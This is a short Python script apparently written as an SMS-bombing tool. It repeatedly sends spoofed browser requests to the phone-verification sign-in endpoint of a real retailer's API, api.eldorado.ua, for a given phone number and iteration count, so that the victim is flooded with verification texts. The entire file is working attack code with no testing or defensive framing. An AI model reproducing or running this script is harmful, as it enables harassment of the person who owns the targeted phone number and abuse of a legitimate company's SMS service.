import requests
import time


def sms_service(number, iterations):
    headers = {
        'authority': 'api.eldorado.ua',
        'origin': 'https://eldorado.ua',
        'selected-language': 'ru',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36',
        'accept': '*/*',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'referer': 'https://eldorado.ua/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6',
    }

    params = (
        ('login', number),
        ('step', 'phone-check'),
        ('fb_id', 'null'),
        ('fb_token', 'null'),
        ('lang', 'ru'),
    )


    for i in range(iterations):
        response = requests.get('https://api.eldorado.ua/v1/sign/', headers=headers, params=params)
        time.sleep(2)
        print(response)